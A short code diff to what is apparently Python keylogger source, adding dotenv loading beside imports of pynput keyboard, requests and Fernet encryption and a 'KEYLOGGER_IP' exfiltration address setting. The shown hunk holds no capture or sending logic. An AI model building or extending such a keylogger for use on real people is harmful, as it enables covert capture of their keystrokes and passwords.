@@ -1,9 +1,12 @@
 from pynput import keyboard
+from dotenv import load_dotenv
 import requests
 import json
 import threading
 import os
 from cryptography.fernet import Fernet
+
+load_dotenv()
 
 # Load configuration from environment variables
 IP_ADDRESS = os.getenv("KEYLOGGER_IP", "127.0.0.1")  # Default to localhost for safety
